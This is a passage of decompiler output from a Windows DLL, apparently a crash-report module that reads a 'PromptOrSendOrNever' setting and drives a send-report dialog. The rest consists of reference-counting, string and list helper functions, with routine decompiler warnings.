                        iVar5 = FUN_1003cb10(extraout_ECX_26,L"PromptOrSendOrNever");
                        if (iVar5 == 0) {
                          FUN_1003cd30(L"dword",extraout_ECX_27,L"PromptOrSendOrNever");
                          puVar11 = (undefined4 *)FUN_1003cce0();
                          uVar16 = 0x100097d7;
                          uVar23 = FUN_10039c20(0,extraout_ECX_28);
                          *puVar11 = uVar23;
                        }
                        else {
                          uVar23 = extraout_ECX_27;
                          FUN_1003cb30(extraout_ECX_27,L"PromptOrSendOrNever");
                          uVar22 = 0x100097a8;
                          FUN_1003cce0();
                          uVar16 = 0x100097b2;
                          local_cc = (int *)FUN_10039b90(uVar23,uVar22);
                        }
                      }
                    }
                  }
                }
              }
            }
            local_d0 = (int ***)FUN_1000bd10();
            ppppiVar19 = &local_d0;
            local_8._0_1_ = 5;
            ppppiVar18 = (int ****)0x100097fd;
            puVar11 = (undefined4 *)FUN_1001d0f0(ppppiVar19);
            local_8._0_1_ = 1;
            *puVar11 = local_cc;
            ppiVar14 = (int **)local_cc;
            ppiVar7 = (int **)local_cc;
            param_1 = local_c0;
            if ((int ****)local_d0 != (int ****)0x0) {
              LOCK();
              pppiVar10 = (int ***)*local_d0;
              *local_d0 = (int **)((int)*local_d0 + -1);
              UNLOCK();
              if ((int)pppiVar10 + -1 < 0) {
                ppppiVar18 = (int ****)0x10009820;
                ppppiVar19 = (int ****)local_d0;
                FUN_100579ee(local_d0);
                ppiVar14 = extraout_ECX_29;
                ppiVar7 = (int **)local_cc;
                param_1 = local_c0;
              }
            }
          }
          else {
            ppiVar7 = pppiVar10[5];
            param_1 = local_c0;
          }
        }
        else {
          ppppiVar19 = (int ****)0x1;
          ppppiVar18 = (int ****)0x2;
          uVar16 = 0;
          local_cc = (int *)FUN_1001c390(L"PromptOrSendOrNever",0,2,1);
          ppiVar14 = extraout_ECX_15;
          ppiVar7 = (int **)local_cc;
          param_1 = local_c0;
        }
      }
      else {
        *local_d8 = (int *)0x4;
        ppiVar14 = extraout_ECX_14;
      }
LAB_1000983d:
      if (((int)ppiVar7 < 0) || (2 < (int)ppiVar7)) {
        ppiVar7 = (int **)0x0;
LAB_10009858:
        local_bc = 0;
        local_b8 = 0x8c;
        local_b4 = 0x11;
        local_b0 = 1;
        local_ac = 0x44e;
        local_a8 = 4;
        local_a4 = 1;
        local_a0 = 0x44f;
        local_9c = 0;
        local_98 = 1;
        local_94 = 0x454;
        local_90 = 7;
        local_8c = 1;
        local_88 = 1;
        local_84 = 5;
        local_80 = 2;
        local_7c = 2;
        local_78 = 0x10;
        local_74 = 1;
        local_70 = 0x44d;
        local_6c = 0xe;
        local_68 = 1;
        local_64 = 0x455;
        local_60 = 0xd;
        FUN_1002c240(*param_1,ppiVar14,&local_bc,uVar16,ppppiVar18,ppppiVar19);
        if (local_138 != 0) {
          param_1[4] = 0;
        }
        local_8._0_1_ = 1;
        if (DAT_1009660c == 2) {
          FUN_1002aef0();
        }
        else {
          FUN_1002aef0();
LAB_10009983:
          iVar5 = *(int *)param_1[1];
          if ((iVar5 == 0) || (*(int *)(iVar5 + 8) == 0)) {
            ppuVar12 = &PTR_10083554;
          }
          else if (iVar5 == 0) {
            ppuVar12 = (undefined **)0x0;
          }
          else {
            ppuVar12 = (undefined **)(iVar5 + 0xc);
          }
          uVar16 = 0x100099af;
          FUN_10020000(ppuVar12,0);
          if (param_1[3] == 0) {
            bVar15 = false;
          }
          else {
            ppuVar12 = (undefined **)0x100099c2;
            FUN_10020d90(extraout_ECX_30);
            bVar15 = param_1[3] != 0;
          }
          local_ec = 0;
          uVar23 = 0x100099e1;
          piVar13 = (int *)FUN_1000c760();
          puVar11 = local_c0;
          if (bVar15) {
            local_5c = 0;
            local_58 = 0x8d;
            local_54 = 3;
            local_50 = 1;
            local_4c = 0x451;
            local_48 = 0xb;
            local_44 = 1;
            local_40 = 2;
            local_3c = 0xf;
            FUN_1002a730(*local_c0,extraout_ECX_31,&local_5c,uVar16,ppuVar12,uVar23);
            FUN_1002a620(extraout_ECX_32);
            FUN_1000c780();
            local_e4 = 0;
            local_c8 = (int ***)FUN_10058b59(0,0,FUN_10009c80,&local_e4,0,local_f8);
            while ((DAT_10096608 == 0 && (local_e4 == 0))) {
              FUN_1000c4b0();
            }
            FUN_10546557(&stack0xfffffffc,local_11c,2);
            uVar3 = FUN_10438fa5(local_c8,1000);
            out(0xff,uVar3);
                    /* WARNING: Bad instruction - Truncating control flow here */
            halt_baddata();
          }
          if (ppiVar7 == (int **)0x0) {
            FUN_1001ad70();
            local_24 = 1;
            local_20 = 1;
            if (*piVar13 == 0) {
              local_24 = 10;
            }
            local_34 = 0x8e;
            local_30 = 0xc;
            local_2c = 1;
            local_28 = 0x452;
            local_1c = 2;
            local_18 = 6;
            local_38 = (int *)ppiVar7;
            FUN_1002cf70(*puVar11,10,&local_38,10,uVar4,unaff_EDI);
            FUN_10009c50();
          }
          if (*piVar13 != 0) {
            local_c0 = (undefined4 *)0x0;
            local_8._0_1_ = 7;
            local_c4 = (int *)FUN_1000c7a0();
            ppppiVar6 = (int ****)0x1;
            local_c8 = (int ***)0x1;
            piVar13 = *(int **)*local_c4;
            if (piVar13 != (int *)*local_c4) {
              do {
                if ((piVar13[2] != 0) && (*(int *)(piVar13[2] + 8) != 0)) {
                  if (ppppiVar6 == (int ****)0x0) {
                    local_c0 = (undefined4 *)FUN_1000bfa0(&DAT_10083900,0xffffffff);
                  }
                  else {
                    local_c8 = (int ***)0x0;
                  }
                  FUN_1000ae70(piVar13 + 2);
                  ppppiVar6 = (int ****)local_c8;
                }
                piVar13 = (int *)*piVar13;
              } while (piVar13 != (int *)*local_c4);
            }
            FUN_1003fa10(4,0);
            FUN_10006f30();
          }
        }
      }
      else if (ppiVar7 != (int **)0x2) {
        if (ppiVar7 == (int **)0x0) goto LAB_10009858;
        goto LAB_10009983;
      }
    }
  }
  FUN_100236e0();
LAB_10009c2a:
  ExceptionList = local_10;
  FUN_100579df();
  return;
}



/* Function: FUN_10009c50 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void __fastcall FUN_10009c50(undefined4 *param_1)

{
  *param_1 = CMultiLingualDlgImpl<class_CSendReportDlg3>::vftable;
  FUN_104843d8();
  _DAT_10096604 = 1;
  DAT_1009acd0 = 0;
  return;
}



/* Function: FUN_10009c80 */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Instruction at (ram,0x1000a426) overlaps instruction at (ram,0x1000a425)
    */
/* WARNING: Removing unreachable block (ram,0x1000a7b0) */
/* WARNING: Removing unreachable block (ram,0x1000a7d6) */
/* WARNING: Removing unreachable block (ram,0x1000a7d1) */
/* WARNING: Removing unreachable block (ram,0x1000a7d8) */
/* WARNING: Removing unreachable block (ram,0x1000a7f7) */
/* WARNING: Removing unreachable block (ram,0x1000a7ff) */
/* WARNING: Removing unreachable block (ram,0x1000a808) */
/* WARNING: Removing unreachable block (ram,0x1000a81c) */
/* WARNING: Removing unreachable block (ram,0x1000a82a) */
/* WARNING: Removing unreachable block (ram,0x1000a825) */
/* WARNING: Removing unreachable block (ram,0x1000a82c) */
/* WARNING: Removing unreachable block (ram,0x1000a892) */
/* WARNING: Removing unreachable block (ram,0x1000a8a2) */
/* WARNING: Removing unreachable block (ram,0x1000a89d) */
/* WARNING: Removing unreachable block (ram,0x1000a8a4) */
/* WARNING: Removing unreachable block (ram,0x1000a8b1) */
/* WARNING: Removing unreachable block (ram,0x1000a8e4) */
/* WARNING: Removing unreachable block (ram,0x1000a8f1) */
/* WARNING: Removing unreachable block (ram,0x1000a901) */
/* WARNING: Removing unreachable block (ram,0x1000a920) */
/* WARNING: Removing unreachable block (ram,0x1000a923) */
/* WARNING: Removing unreachable block (ram,0x1000a943) */
/* WARNING: Removing unreachable block (ram,0x1000a94b) */
/* WARNING: Removing unreachable block (ram,0x1000a954) */
/* WARNING: Removing unreachable block (ram,0x1000a95f) */
/* WARNING: Removing unreachable block (ram,0x1000a967) */
/* WARNING: Removing unreachable block (ram,0x1000a970) */
/* WARNING: Removing unreachable block (ram,0x10009f8e) */
/* WARNING: Removing unreachable block (ram,0x10009f97) */
/* WARNING: Removing unreachable block (ram,0x1000a3f8) */
/* WARNING: Removing unreachable block (ram,0x1000a402) */
/* WARNING: Removing unreachable block (ram,0x1000a426) */
/* WARNING: Removing unreachable block (ram,0x1000a43a) */
/* WARNING: Removing unreachable block (ram,0x1000a4cf) */

undefined4 FUN_10009c80(undefined4 *param_1)

{
  undefined4 *puVar1;
  int *piVar2;
  int iVar3;
  int *piVar4;
  int iVar5;
  int *piVar6;
  int *piVar7;
  int *piVar8;
  uint uVar9;
  short *psVar10;
  int *extraout_EDX;
  int *in_stack_0000ef3b;
  int *local_228;
  uint local_224;
  int *local_218;
  int local_214;
  int local_210;
  uint local_208;
  int iStack_1ec;
  int local_1d8;
  int *piStack_1cc;
  int *piStack_1c8;
  int *piStack_1bc;
  int *local_1b8;
  int *local_1b0;
  int *local_154;
  int *local_150;
  int local_114;
  int iStack_f8;
  int iStack_f0;
  int local_ec;
  int local_bc;
  void *pvStack_2c;
  void *local_14;
  undefined1 *puStack_10;
  undefined4 local_c;
  
  puStack_10 = &LAB_1007449d;
  local_14 = ExceptionList;
  ExceptionList = &local_14;
  local_208 = 0;
  if (DAT_10099188[1] != 0) {
    do {
      uVar9 = 0;
      puVar1 = *(undefined4 **)*DAT_10099188;
      if (local_208 != 0) {
        do {
          if (puVar1 == (undefined4 *)*DAT_10099188) break;
          puVar1 = (undefined4 *)*puVar1;
          uVar9 = uVar9 + 1;
        } while (uVar9 < local_208);
      }
      piVar8 = (int *)puVar1[2];
      if (piVar8 != (int *)0x0) {
        LOCK();
        *piVar8 = *piVar8 + 1;
        UNLOCK();
      }
      local_c._0_1_ = 1;
      local_c._1_3_ = 0;
      if ((((piVar8 == (int *)0x0) || (piVar8[2] == 0)) || (piVar8 + 3 == (int *)0x0)) ||
         ((short)piVar8[3] == 0)) {
        piVar2 = (int *)0x0;
      }
      else {
        piVar2 = (int *)FUN_1000c290();
      }
      local_c = CONCAT31(local_c._1_3_,2);
      if (piVar8 != (int *)0x0) {
        LOCK();
        *piVar8 = *piVar8 + 1;
        UNLOCK();
      }
      iVar3 = FUN_10010c00();
      if (iVar3 == 0) {
        if (piVar8 != (int *)0x0) {
          if (*piVar8 == 0) {
            piVar8[2] = 0;
            *(undefined2 *)(piVar8 + 3) = 0;
            local_228 = piVar8;
            goto LAB_10009def;
          }
          LOCK();
          iVar3 = *piVar8;
          *piVar8 = iVar3 + -1;
          UNLOCK();
          if (iVar3 + -1 < 0) {
            FUN_100579ee();
          }
        }
        local_228 = (int *)0x0;
      }
      else {
        FUN_1000e640();
        local_228 = (int *)FUN_10010440();
        if (local_1b8 != (int *)0x0) {
          LOCK();
          iVar3 = *local_1b8;
          *local_1b8 = iVar3 + -1;
          UNLOCK();
          if (iVar3 + -1 < 0) {
            FUN_100579ee();
          }
        }
      }
LAB_10009def:
      iVar3 = FUN_10010c00();
      if (iVar3 == -1) {
        if (local_228 != (int *)0x0) {
          if (*local_228 == 0) {
            local_228[2] = 0;
            *(undefined2 *)(local_228 + 3) = 0;
            goto LAB_10009e89;
          }
          LOCK();
          iVar3 = *local_228;
          *local_228 = iVar3 + -1;
          UNLOCK();
          if (iVar3 + -1 < 0) {
            FUN_100579ee();
          }
        }
        local_228 = (int *)0x0;
      }
      else {
        FUN_1000e640();
        local_228 = (int *)FUN_10010440();
        if (local_1b0 != (int *)0x0) {
          LOCK();
          iVar3 = *local_1b0;
          *local_1b0 = iVar3 + -1;
          UNLOCK();
          if (iVar3 + -1 < 0) {
            FUN_100579ee();
          }
        }
      }
LAB_10009e89:
      FUN_1000bdd0();
      if (local_228 != (int *)0x0) {
        LOCK();
        iVar3 = *local_228;
        *local_228 = iVar3 + -1;
        UNLOCK();
        if (iVar3 + -1 < 0) {
          FUN_100579ee();
        }
      }
      piVar4 = (int *)FUN_1000bfa0();
      FUN_10023360();
      local_c._0_1_ = 3;
      iVar3 = 0x29;
      do {
        iVar5 = FUN_10023490();
        if (iVar5 != 0) break;
        iVar3 = iVar3 + -1;
      } while (iVar3 != 0);
      local_224 = 0;
      if (local_210 != 0) {
        FUN_1003cef0();
        local_c._0_1_ = 5;
        local_224 = FUN_100388c0();
        local_c._0_1_ = 7;
        if (local_114 != 0) {
          FUN_1003b790();
        }
        FUN_1003d910();
        thunk_FUN_100579ee();
        FUN_1003a250();
        if (local_150 != (int *)0x0) {
          LOCK();
          iVar3 = *local_150;
          *local_150 = iVar3 + -1;
          UNLOCK();
          if (iVar3 + -1 < 0) {
            FUN_100579ee();
          }
        }
        if (local_154 != (int *)0x0) {
          LOCK();
          iVar3 = *local_154;
          *local_154 = iVar3 + -1;
          UNLOCK();
          if (iVar3 + -1 < 0) {
            FUN_100579ee();
          }
        }
      }
      if (local_214 != 0) {
        FUN_104fff2e();
                    /* WARNING: Bad instruction - Truncating control flow here */
        halt_baddata();
      }
      if (local_224 == 0) {
        if (piVar2 != (int *)0x0) {
          LOCK();
          *piVar2 = *piVar2 + 1;
          UNLOCK();
        }
        local_c._0_1_ = 8;
        FUN_1000c8e0();
        FUN_1000c980();
        local_c._0_1_ = 9;
        FUN_1000d390();
        if ((DAT_1009acb0 & 1) == 0) {
          DAT_1009acb0 = DAT_1009acb0 | 1;
          local_c._0_1_ = 10;
          DAT_1009aca8 = 0;
          DAT_1009acac = 0;
          DAT_1009aca8 = FUN_1000fa00();
          FUN_10057b51();
          local_c._0_1_ = 9;
        }
        uVar9 = DAT_1009aca8;
        if ((local_bc != 0) && (*(int *)(local_bc + 8) != 0)) {
          local_224 = DAT_1009aca8;
          iVar3 = FUN_10011570();
          if (DAT_1009acac == 0x15555554) goto LAB_1000a651;
          DAT_1009acac = DAT_1009acac + 1;
          *(int *)(uVar9 + 4) = iVar3;
          **(int **)(iVar3 + 4) = iVar3;
        }
        if ((DAT_1009acbc & 1) == 0) {
          DAT_1009acbc = DAT_1009acbc | 1;
          local_c._0_1_ = 0xb;
          DAT_1009acb4 = 0;
          DAT_1009acb8 = 0;
          DAT_1009acb4 = FUN_1000fa00();
          FUN_10057b51();
          local_c._0_1_ = 9;
        }
        iVar3 = DAT_1009acb4;
        if ((local_ec != 0) && (*(int *)(local_ec + 8) != 0)) {
          iVar5 = FUN_10011570();
          if (DAT_1009acb8 == 0x15555554) {
LAB_1000a651:
            FUN_10056a6a();
            DAT_1009acd8 = extraout_EDX;
LAB_1000a65b:
            DAT_1009acd8[1] = 0x10;
            DAT_1009acd8[2] = 2;
            *DAT_1009acd8 = 0;
            DAT_1009acd8[3] = iStack_1ec;
            *(undefined2 *)((int)DAT_1009acd8 + DAT_1009acd8[2] * 2 + 0xc) = 0;
            DAT_1009acd8[2] = 0;
            *(undefined2 *)(DAT_1009acd8 + 3) = 0;
LAB_1000a691:
            FUN_10057b51();
LAB_1000a6a4:
            piVar8 = DAT_1009acd8;
            if (DAT_1009acd8 != (int *)0x0) {
              LOCK();
              *DAT_1009acd8 = *DAT_1009acd8 + 1;
              UNLOCK();
              piVar8 = DAT_1009acd8;
            }
            do {
              local_c = CONCAT31(local_c._1_3_,0x14);
              iVar3 = FUN_10010c00();
              if (iVar3 == -1) {
                if (piVar8 != (int *)0x0) {
                  if (*piVar8 == 0) {
                    piVar8[2] = 0;
                    *(undefined2 *)(piVar8 + 3) = 0;
                    goto LAB_1000a766;
                  }
                  LOCK();
                  iVar3 = *piVar8;
                  *piVar8 = iVar3 + (int)piVar2;
                  UNLOCK();
                  if (iVar3 + (int)piVar2 < 0) {
                    FUN_100579ee();
                  }
                }
                piVar8 = (int *)0x0;
              }
              else {
                FUN_1000e640();
                piVar8 = (int *)FUN_10010440();
                if (piStack_1bc != (int *)0x0) {
                  LOCK();
                  iVar3 = *piStack_1bc;
                  *piStack_1bc = iVar3 + (int)piVar2;
                  UNLOCK();
                  if (iVar3 + (int)piVar2 < 0) {
                    FUN_100579ee();
                  }
                }
              }
LAB_1000a766:
              FUN_1000fa00();
              local_c._0_1_ = 0x15;
              FUN_10020000();
              local_c._0_1_ = 0x16;
              FUN_1000ba10();
              thunk_FUN_100579ee();
              local_c._0_1_ = 0x13;
              if (piVar8 != (int *)0x0) {
                LOCK();
                iVar3 = *piVar8;
                *piVar8 = iVar3 + (int)piVar2;
                UNLOCK();
                if (iVar3 + (int)piVar2 < 0) {
                  FUN_100579ee();
                }
              }
              local_208 = local_208 + 1;
              if (local_224 <= local_208) goto LAB_1000a9c1;
              iVar3 = *(int *)(local_1d8 + local_208 * 4);
              if (((iVar3 != 0) && (psVar10 = (short *)(iVar3 + 0xc), psVar10 != (short *)0x0)) &&
                 (*psVar10 == 0)) goto code_r0x1000a628;
              piVar8 = (int *)FUN_1000bd10();
            } while( true );
          }
          DAT_1009acb8 = DAT_1009acb8 + 1;
          *(int *)(iVar3 + 4) = iVar5;
          **(int **)(iVar5 + 4) = iVar5;
          local_c._0_1_ = 0xc;
          if (((local_ec == 0) || ((char *)(local_ec + 0xc) == (char *)0x0)) ||
             (*(char *)(local_ec + 0xc) == '\0')) {
            piVar6 = (int *)0x0;
          }
          else {
            piVar6 = (int *)FUN_1000c0a0();
          }
          iVar3 = 0x29;
          do {
            iVar5 = FUN_10023490();
            if (iVar5 != 0) break;
            iVar3 = iVar3 + -1;
          } while (iVar3 != 0);
          if (local_210 != 0) {
            FUN_1003cef0();
            if (((piVar6 == (int *)0x0) || (piVar6 + 3 == (int *)0x0)) || ((short)piVar6[3] != 0)) {
              piVar4 = (int *)FUN_1000bd10();
            }
            else {
              piVar4 = (int *)FUN_1000ba60();
            }
            local_c = CONCAT31(local_c._1_3_,0xe);
            piVar7 = (int *)FUN_100387f0();
            if (piVar4 != (int *)0x0) {
              LOCK();
              iVar3 = *piVar4;
              *piVar4 = iVar3 + -1;
              UNLOCK();
              if (iVar3 + -1 < 0) {
                FUN_100579ee();
              }
            }
            FUN_1000bd10();
            local_c = CONCAT31(local_c._1_3_,0xf);
            if ((*piVar7 != 0) && (*(int *)(*piVar7 + 8) != 0)) {
              FUN_1000bfa0();
            }
            FUN_1000bfa0();
            if ((piVar6 != (int *)0x0) && (piVar6[2] != 0)) {
              FUN_1000bfa0();
            }
            piVar4 = (int *)FUN_1000bfa0();
            FUN_1003fa10();
            if (piVar4 != (int *)0x0) {
              LOCK();
              iVar3 = *piVar4;
              *piVar4 = iVar3 + -1;
              UNLOCK();
              if (iVar3 + -1 < 0) {
                FUN_100579ee();
              }
            }
            local_c._0_1_ = 0xc;
            FUN_1003d1f0();
          }
          piVar4 = in_stack_0000ef3b;
          if (piVar6 != (int *)0x0) {
            LOCK();
            iVar3 = *piVar6;
            *piVar6 = iVar3 + -1;
            UNLOCK();
            if (iVar3 + -1 < 0) {
              FUN_100579ee();
            }
          }
        }
        if ((((DAT_1009aba4 == 0) || (*(int *)(DAT_1009aba4 + 8) == 0)) ||
            (iVar3 = FUN_1004b5c0(), iVar3 == -1)) && (iStack_f0 == 0)) {
          if (iStack_f8 != 0) goto LAB_1000a495;
        }
        else {
          iStack_f0 = 1;
LAB_1000a495:
          FUN_1000d7f0();
        }
        FUN_1000aa70();
        if (piVar2 != (int *)0x0) {
          LOCK();
          iVar3 = *piVar2;
          *piVar2 = iVar3 + -1;
          UNLOCK();
          if (iVar3 + -1 < 0) {
            FUN_100579ee();
          }
        }
      }
      if (local_218 != (int *)0x0) {
        LOCK();
        iVar3 = *local_218;
        *local_218 = iVar3 + -1;
        UNLOCK();
        if (iVar3 + -1 < 0) {
          FUN_100579ee();
        }
      }
      if (piVar4 != (int *)0x0) {
        LOCK();
        iVar3 = *piVar4;
        *piVar4 = iVar3 + -1;
        UNLOCK();
        if (iVar3 + -1 < 0) {
          FUN_100579ee();
        }
      }
      if (piVar2 != (int *)0x0) {
        LOCK();
        iVar3 = *piVar2;
        *piVar2 = iVar3 + -1;
        UNLOCK();
        if (iVar3 + -1 < 0) {
          FUN_100579ee();
        }
      }
      if (piVar8 != (int *)0x0) {
        LOCK();
        iVar3 = *piVar8;
        *piVar8 = iVar3 + -1;
        UNLOCK();
        if (iVar3 + -1 < 0) {
          FUN_100579ee();
        }
      }
      local_208 = local_208 + 1;
    } while (local_208 < (uint)DAT_10099188[1]);
  }
  piVar2 = (int *)0xffffffff;
  local_c = 0x10;
  piStack_1cc = (int *)FUN_1000bd10();
  piStack_1c8 = (int *)FUN_1000bd10();
  local_c = CONCAT31(local_c._1_3_,0x12);
  FUN_1001faf0();
  FUN_1001faf0();
  FUN_1001f140();
  local_c._0_1_ = 0x13;
  local_c._1_3_ = 0;
LAB_1000a9c1:
  if (piStack_1c8 != (int *)0x0) {
    LOCK();
    iVar3 = *piStack_1c8;
    *piStack_1c8 = iVar3 + (int)piVar2;
    UNLOCK();
    if (iVar3 + (int)piVar2 < 0) {
      FUN_100579ee();
    }
  }
  if (piStack_1cc != (int *)0x0) {
    LOCK();
    iVar3 = *piStack_1cc;
    *piStack_1cc = *piStack_1cc + (int)piVar2;
    UNLOCK();
    if (iVar3 + -1 < 0) {
      FUN_100579ee();
    }
  }
  FUN_1000b750();
  *param_1 = 1;
  (*DAT_10079310)();
  if ((DAT_1009b44c & 1) == 0) {
    DAT_1009b44c = DAT_1009b44c | 1;
    DAT_1009b450 = 0;
  }
  FUN_1031c809();
  FUN_10058c33();
  ExceptionList = pvStack_2c;
  return 0;
code_r0x1000a628:
  if ((DAT_1009acdc & 1) == 0) goto code_r0x1000a631;
  goto LAB_1000a6a4;
code_r0x1000a631:
  DAT_1009acdc = DAT_1009acdc | 1;
  iStack_1ec = 0;
  DAT_1009acd8 = (int *)FUN_100581b4();
  if (DAT_1009acd8 != (int *)0x0) goto LAB_1000a65b;
  goto LAB_1000a691;
}



/* Function: FUN_1000aa60 */

void FUN_1000aa60(void)

{
  FUN_1003d1f0();
  return;
}



/* Function: FUN_1000aa70 */

void __fastcall FUN_1000aa70(int param_1)

{
  int iVar1;
  int *piVar2;
  
  piVar2 = *(int **)(param_1 + 0x4c);
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = *(int **)(param_1 + 0x40);
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = *(int **)(param_1 + 0x3c);
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = *(int **)(param_1 + 0x38);
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = *(int **)(param_1 + 0x34);
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = *(int **)(param_1 + 0x30);
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = *(int **)(param_1 + 0x2c);
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = *(int **)(param_1 + 0x28);
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  FUN_1000ba10();
  thunk_FUN_100579ee(*(undefined4 *)(param_1 + 0x20));
  piVar2 = *(int **)(param_1 + 0x1c);
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = *(int **)(param_1 + 8);
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = *piVar2 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  return;
}



/* Function: FUN_1000ab80 */

void __fastcall FUN_1000ab80(int param_1)

{
  int iVar1;
  int *piVar2;
  
  piVar2 = *(int **)(param_1 + 0x10);
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = *(int **)(param_1 + 0xc);
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = *piVar2 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  FUN_1000b750();
  return;
}



/* Function: FUN_1000abc0 */

undefined1 * __thiscall FUN_1000abc0(undefined1 *param_1,char *param_2)

{
  char cVar1;
  char *pcVar2;
  
  *(undefined4 *)(param_1 + 0x14) = 0xf;
  *(undefined4 *)(param_1 + 0x10) = 0;
  *param_1 = 0;
  if (*param_2 == '\0') {
    FUN_1000b7b0(param_2,0);
    return param_1;
  }
  pcVar2 = param_2;
  do {
    cVar1 = *pcVar2;
    pcVar2 = pcVar2 + 1;
  } while (cVar1 != '\0');
  FUN_1000b7b0(param_2,(int)pcVar2 - (int)(param_2 + 1));
  return param_1;
}



/* Function: FUN_1000ac20 */

void __fastcall FUN_1000ac20(undefined4 *param_1)

{
  if (0xf < (uint)param_1[5]) {
    thunk_FUN_100579ee(*param_1);
  }
  param_1[5] = 0xf;
  param_1[4] = 0;
  *(undefined1 *)param_1 = 0;
  return;
}



/* Function: FUN_1000ac50 */

void FUN_1000ac50(char *param_1)

{
  char cVar1;
  char *pcVar2;
  
  if (*param_1 == '\0') {
    FUN_1000b3d0(param_1,0);
    return;
  }
  pcVar2 = param_1;
  do {
    cVar1 = *pcVar2;
    pcVar2 = pcVar2 + 1;
  } while (cVar1 != '\0');
  FUN_1000b3d0(param_1,(int)pcVar2 - (int)(param_1 + 1));
  return;
}



/* Function: FUN_1000ac90 */

void __thiscall FUN_1000ac90(int *param_1,undefined4 param_2)

{
  int iVar1;
  code *pcVar2;
  int iVar3;
  
  iVar1 = *param_1;
  iVar3 = FUN_10011570(iVar1,*(undefined4 *)(iVar1 + 4),param_2);
  if (param_1[1] != 0x15555554) {
    param_1[1] = param_1[1] + 1;
    *(int *)(iVar1 + 4) = iVar3;
    **(int **)(iVar3 + 4) = iVar3;
    return;
  }
  FUN_10056a6a("list<T> too long");
  pcVar2 = (code *)swi(3);
  (*pcVar2)();
  return;
}



/* Function: FUN_1000ace0 */

undefined4 * __thiscall FUN_1000ace0(undefined4 *param_1,undefined4 *param_2)

{
  int *piVar1;
  
  piVar1 = (int *)*param_2;
  *param_1 = piVar1;
  if (piVar1 != (int *)0x0) {
    LOCK();
    *piVar1 = *piVar1 + 1;
    UNLOCK();
  }
  return param_1;
}



/* Function: FUN_1000ad00 */

undefined4 * __thiscall FUN_1000ad00(undefined4 *param_1,short *param_2)

{
  undefined4 uVar1;
  
  if ((param_2 != (short *)0x0) && (*param_2 == 0)) {
    uVar1 = FUN_1000ba60();
    *param_1 = uVar1;
    return param_1;
  }
  uVar1 = FUN_1000bd10();
  *param_1 = uVar1;
  return param_1;
}



/* Function: FUN_1000ad40 */

void __thiscall FUN_1000ad40(undefined4 *param_1,int *param_2)

{
  int iVar1;
  undefined4 uVar2;
  
  iVar1 = *param_2;
  if ((iVar1 != 0) && (*(int *)(iVar1 + 8) != 0)) {
    uVar2 = FUN_1000bfa0(iVar1 + 0xc,*(undefined4 *)(iVar1 + 8));
    *param_1 = uVar2;
  }
  return;
}



/* Function: FUN_1000ad70 */

int __thiscall FUN_1000ad70(int *param_1,short *param_2,int param_3,uint param_4)

{
  short sVar1;
  int iVar2;
  short *psVar3;
  
  if ((*param_1 != 0) && (param_4 < *(uint *)(*param_1 + 8))) {
    if (param_3 == -1) {
      if (param_2 == (short *)0x0) {
        param_3 = 0;
      }
      else {
        psVar3 = param_2;
        do {
          sVar1 = *psVar3;
          psVar3 = psVar3 + 1;
        } while (sVar1 != 0);
        param_3 = (int)psVar3 - (int)(param_2 + 1) >> 1;
      }
    }
    iVar2 = FUN_1004b5c0(param_2,param_3);
    if (iVar2 != -1) {
      return iVar2 + param_4;
    }
  }
  return -1;
}



/* Function: FUN_1000adf0 */

undefined ** __fastcall FUN_1000adf0(int *param_1)

{
  int iVar1;
  
  iVar1 = *param_1;
  if ((iVar1 != 0) && (*(int *)(iVar1 + 8) != 0)) {
    if (iVar1 != 0) {
      return (undefined **)(iVar1 + 0xc);
    }
    return (undefined **)0x0;
  }
  return &PTR_10083554;
}



/* Function: FUN_1000ae10 */

undefined4 * __thiscall FUN_1000ae10(undefined4 param_1,undefined4 *param_2)

{
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_100744d9;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_2 = 0;
  local_8 = 0;
  FUN_1000aea0(param_1);
  ExceptionList = local_10;
  return param_2;
}



